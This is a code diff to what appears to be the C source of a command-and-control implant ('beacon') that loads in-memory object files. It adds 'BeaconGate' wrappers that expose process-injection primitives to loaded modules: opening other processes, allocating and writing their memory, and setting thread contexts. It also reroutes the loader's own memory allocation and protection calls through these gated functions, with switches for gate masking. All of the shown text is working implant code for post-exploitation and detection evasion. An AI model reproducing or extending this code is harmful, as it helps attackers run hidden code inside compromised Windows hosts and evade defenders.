@@ -5,6 +5,7 @@
  * This is the code to make all of it work though.
  */
 #include <Windows.h>
+#include "beacon_gate.h" /* BeaconGate: gate_* = the API with the gate in front */
 #include <stdio.h>
 #include <string.h>
 #include <stdarg.h>
@@ -234,6 +235,31 @@ typedef struct {
 	 * Field order matches bapi.txt tail (BeaconDownload -> these two). */
 	BOOL   (*BeaconGetSyscallInformation)(PBEACON_SYSCALLS info, SIZE_T infoSize, BOOL resolveIfNotInitialized);
 	BOOL   (*BeaconReadProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesRead);
+	/* 4.10 BOF system-call API + the BeaconGate switches (official
+	 * beacon.h prototypes). Each beacon_* wrapper is: BeaconGate on for
+	 * that API -> the gate; else the beacon's syscall method; else the
+	 * plain API. Order and count must match resources/bapi.txt: the TS
+	 * resolves a COFF BOF's Beacon API import to an INDEX into this
+	 * table (the relocation loop below, and the assert after it). */
+	LPVOID   (*BeaconVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+	LPVOID   (*BeaconVirtualAllocEx)(HANDLE processHandle, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+	BOOL     (*BeaconVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
+	BOOL     (*BeaconVirtualProtectEx)(HANDLE processHandle, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
+	BOOL     (*BeaconVirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
+	BOOL     (*BeaconGetThreadContext)(HANDLE threadHandle, PCONTEXT threadContext);
+	BOOL     (*BeaconSetThreadContext)(HANDLE threadHandle, PCONTEXT threadContext);
+	DWORD    (*BeaconResumeThread)(HANDLE threadHandle);
+	HANDLE   (*BeaconOpenProcess)(DWORD desiredAccess, BOOL inheritHandle, DWORD processId);
+	HANDLE   (*BeaconOpenThread)(DWORD desiredAccess, BOOL inheritHandle, DWORD threadId);
+	BOOL     (*BeaconCloseHandle)(HANDLE object);
+	BOOL     (*BeaconUnmapViewOfFile)(LPCVOID baseAddress);
+	SIZE_T   (*BeaconVirtualQuery)(LPCVOID address, PMEMORY_BASIC_INFORMATION buffer, SIZE_T length);
+	BOOL     (*BeaconDuplicateHandle)(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
+	BOOL     (*BeaconWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten);
+	void     (*BeaconDisableBeaconGate)();
+	void     (*BeaconEnableBeaconGate)();
+	void     (*BeaconDisableBeaconGateMasking)();
+	void     (*BeaconEnableBeaconGateMasking)();
 
 	/* our other pointers: 4.12 Dynamic Import. The named API fields above
 	 * keep their offsets (BOFs compile against beacon.h field names); this
@@ -242,6 +268,12 @@ typedef struct {
 	 * (4.9: fixed other[64]; 4.10 official: 128). */
 	void * other;
 } BOFF_FUNCTIONS;
+
+/* COFF BOFs resolve a Beacon API by its index in the TS's bapi.txt:
+ * ftable + index * sizeof(char *) (the relocation loop below). That
+ * only holds while every field is exactly one pointer: 62 slots, the
+ * last one at (62 - 1) * sizeof(void *). */
+typedef char boff_assert_slots[offsetof(BOFF_FUNCTIONS, BeaconEnableBeaconGateMasking) == (62 - 1) * sizeof(void *) ? 1 : -1];
 
 /* chunked dynamic-import slot table: chunk addresses never move once
  * allocated (relocations patch references to slot addresses), while the
@@ -374,6 +406,25 @@ void setup_functions(BOFF_FUNCTIONS * f) {
 	f->BeaconDownload               = beacon_download_buffer;
 	f->BeaconGetSyscallInformation  = syscalls_fill_beacon_syscalls;
 	f->BeaconReadProcessMemory      = beacon_ReadProcessMemory;
+	f->BeaconVirtualAlloc              = beacon_VirtualAlloc;
+	f->BeaconVirtualAllocEx            = beacon_VirtualAllocEx;
+	f->BeaconVirtualProtect            = beacon_VirtualProtect;
+	f->BeaconVirtualProtectEx          = beacon_VirtualProtectEx;
+	f->BeaconVirtualFree               = beacon_VirtualFree;
+	f->BeaconGetThreadContext          = beacon_GetThreadContext;
+	f->BeaconSetThreadContext          = beacon_SetThreadContext;
+	f->BeaconResumeThread              = beacon_ResumeThread;
+	f->BeaconOpenProcess               = beacon_OpenProcess;
+	f->BeaconOpenThread                = beacon_OpenThread;
+	f->BeaconCloseHandle               = beacon_CloseHandle;
+	f->BeaconUnmapViewOfFile           = beacon_UnmapViewOfFile;
+	f->BeaconVirtualQuery              = beacon_VirtualQuery;
+	f->BeaconDuplicateHandle           = beacon_DuplicateHandle;
+	f->BeaconWriteProcessMemory        = beacon_WriteProcessMemory;
+	f->BeaconDisableBeaconGate         = BeaconDisableBeaconGate;
+	f->BeaconEnableBeaconGate          = BeaconEnableBeaconGate;
+	f->BeaconDisableBeaconGateMasking  = BeaconDisableBeaconGateMasking;
+	f->BeaconEnableBeaconGateMasking   = BeaconEnableBeaconGateMasking;
 	f->BeaconGetCustomUserData      = BeaconGetCustomUserData;
 }
 
@@ -525,15 +576,15 @@ static char * bof_alloc(SIZE_T total, int * how) {
 	int allocator = setting_short(SETTING_BOF_ALLOCATOR);
 	*how = allocator;
 	if (allocator == 1) {
-		HANDLE map = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, (DWORD)total, NULL);
+		HANDLE map = gate_CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, (DWORD)total, NULL);
 		char * p;
 		if (map == NULL)
 			return NULL;
 		/* map RW-only: the code region flips to RX via the permission
 		 * split in command_inline_execute_object_parsed before the BOF
 		 * runs - no need to hold FILE_MAP_EXECUTE (RWX) up front */
-		p = (char *)MapViewOfFile(map, FILE_MAP_ALL_ACCESS, 0, 0, total);
-		CloseHandle(map);
+		p = (char *)gate_MapViewOfFile(map, FILE_MAP_ALL_ACCESS, 0, 0, total);
+		gate_CloseHandle(map);
 		return p;
 	}
 	if (allocator == 2) {
@@ -545,18 +596,18 @@ static char * bof_alloc(SIZE_T total, int * how) {
 	*how = 0;
 	if (perms == 0)
 		perms = PAGE_READWRITE;
-	return (char *)VirtualAlloc(NULL, total, MEM_RESERVE | MEM_COMMIT, perms);
+	return (char *)gate_VirtualAlloc(NULL, total, MEM_RESERVE | MEM_COMMIT, perms);
 }
 
 static void bof_free(char * p, int how) {
 	if (p == NULL)
 		return;
 	if (how == 1)
-		UnmapViewOfFile(p);
+		gate_UnmapViewOfFile(p);
 	else if (how == 2)
 		return; /* HeapCreate block is not tracked; leak vs double-free. reuse covers this. */
 	else
-		VirtualFree(p, 0, MEM_RELEASE);
+		gate_VirtualFree(p, 0, MEM_RELEASE);
 }
 
 static char * bof_cached;
@@ -787,7 +838,7 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		how = bof_cached_how;
 		/* the block idles RW after each run (see the tail of this function);
 		 * re-assert RW in case a previous finalize left it RX */
-		VirtualProtect(base, bof_cached_size, PAGE_READWRITE, &oldrw);
+		gate_VirtualProtect(base, bof_cached_size, PAGE_READWRITE, &oldrw);
 		memset(base, 0, total);
 	}
 	else {
@@ -954,9 +1005,9 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		BOOL perms_ok = TRUE;
 		if (codeperm == 0 || codeperm == (DWORD)setting_short(SETTING_PROCINJ_PERMS_I))
 			codeperm = PAGE_EXECUTE_READ;
-		perms_ok = VirtualProtect(base, (SIZE_T)(data_dst - base), codeperm, &oldp);
+		perms_ok = gate_VirtualProtect(base, (SIZE_T)(data_dst - base), codeperm, &oldp);
 		if (perms_ok && (SIZE_T)(base + total - data_dst) > 0)
-			perms_ok = VirtualProtect(data_dst, (SIZE_T)(base + total - data_dst), PAGE_READWRITE, &oldp);
+			perms_ok = gate_VirtualProtect(data_dst, (SIZE_T)(base + total - data_dst), PAGE_READWRITE, &oldp);
 		if (!perms_ok) {
 			spawn_log("bofload perms fail gle=", (long)GetLastError());
 			post_error_d(0x11, (int)GetLastError());
@@ -1088,7 +1139,7 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		/* cached-for-reuse block idles as RW (de-executed): executable only
 		 * while a BOF actually runs, writable again for the next load */
 		DWORD oldw = 0;
-		VirtualProtect(base, total, PAGE_READWRITE, &oldw);
+		gate_VirtualProtect(base, total, PAGE_READWRITE, &oldw);
 	}
 	if (base == bof_pinned) {
 		/* the pinned BOF's DYNAMICF import slots point INTO the slot
@@ -1178,6 +1229,25 @@ static const BOFPE_API_MAP bofpe_apis[] = {
 	{ "BeaconDownload",                 offsetof(BOFF_FUNCTIONS, BeaconDownload) },
 	{ "BeaconGetSyscallInformation",    offsetof(BOFF_FUNCTIONS, BeaconGetSyscallInformation) },
 	{ "BeaconReadProcessMemory",        offsetof(BOFF_FUNCTIONS, BeaconReadProcessMemory) },
+	{ "BeaconVirtualAlloc",                offsetof(BOFF_FUNCTIONS, BeaconVirtualAlloc) },
+	{ "BeaconVirtualAllocEx",              offsetof(BOFF_FUNCTIONS, BeaconVirtualAllocEx) },
+	{ "BeaconVirtualProtect",              offsetof(BOFF_FUNCTIONS, BeaconVirtualProtect) },
+	{ "BeaconVirtualProtectEx",            offsetof(BOFF_FUNCTIONS, BeaconVirtualProtectEx) },
+	{ "BeaconVirtualFree",                 offsetof(BOFF_FUNCTIONS, BeaconVirtualFree) },
+	{ "BeaconGetThreadContext",            offsetof(BOFF_FUNCTIONS, BeaconGetThreadContext) },
+	{ "BeaconSetThreadContext",            offsetof(BOFF_FUNCTIONS, BeaconSetThreadContext) },
+	{ "BeaconResumeThread",                offsetof(BOFF_FUNCTIONS, BeaconResumeThread) },
+	{ "BeaconOpenProcess",                 offsetof(BOFF_FUNCTIONS, BeaconOpenProcess) },
+	{ "BeaconOpenThread",                  offsetof(BOFF_FUNCTIONS, BeaconOpenThread) },
+	{ "BeaconCloseHandle",                 offsetof(BOFF_FUNCTIONS, BeaconCloseHandle) },
+	{ "BeaconUnmapViewOfFile",             offsetof(BOFF_FUNCTIONS, BeaconUnmapViewOfFile) },
+	{ "BeaconVirtualQuery",                offsetof(BOFF_FUNCTIONS, BeaconVirtualQuery) },
+	{ "BeaconDuplicateHandle",             offsetof(BOFF_FUNCTIONS, BeaconDuplicateHandle) },
+	{ "BeaconWriteProcessMemory",          offsetof(BOFF_FUNCTIONS, BeaconWriteProcessMemory) },
+	{ "BeaconDisableBeaconGate",           offsetof(BOFF_FUNCTIONS, BeaconDisableBeaconGate) },
+	{ "BeaconEnableBeaconGate",            offsetof(BOFF_FUNCTIONS, BeaconEnableBeaconGate) },
+	{ "BeaconDisableBeaconGateMasking",    offsetof(BOFF_FUNCTIONS, BeaconDisableBeaconGateMasking) },
+	{ "BeaconEnableBeaconGateMasking",     offsetof(BOFF_FUNCTIONS, BeaconEnableBeaconGateMasking) },
 };
 
 static void * bofpe_resolve_api(BOFF_FUNCTIONS * f, const char * name) {
@@ -1357,7 +1427,7 @@ static void bofpe_section_perms(char * base, IMAGE_NT_HEADERS * nt) {
 	int i;
 	DWORD oldp = 0;
 
-	VirtualProtect(base, nt->OptionalHeader.SizeOfHeaders, PAGE_READWRITE, &oldp);
+	gate_VirtualProtect(base, nt->OptionalHeader.SizeOfHeaders, PAGE_READWRITE, &oldp);
 	for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
 		DWORD fl = sec[i].Characteristics;
 		DWORD prot, size;
@@ -1374,7 +1444,7 @@ static void bofpe_section_perms(char * base, IMAGE_NT_HEADERS * nt) {
 		}
 		at = base + sec[i].VirtualAddress;
 		size = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
-		VirtualProtect(at, size, prot, &oldp);
+		gate_VirtualProtect(at, size, prot, &oldp);
 	}
 }
 
@@ -1514,7 +1584,7 @@ cleanup:
 #endif
 	{
 		DWORD oldrw = 0;
-		VirtualProtect(base, image, PAGE_READWRITE, &oldrw);
+		gate_VirtualProtect(base, image, PAGE_READWRITE, &oldrw);
 	}
 	memset(base, 0, image);
 	bof_free(base, how);
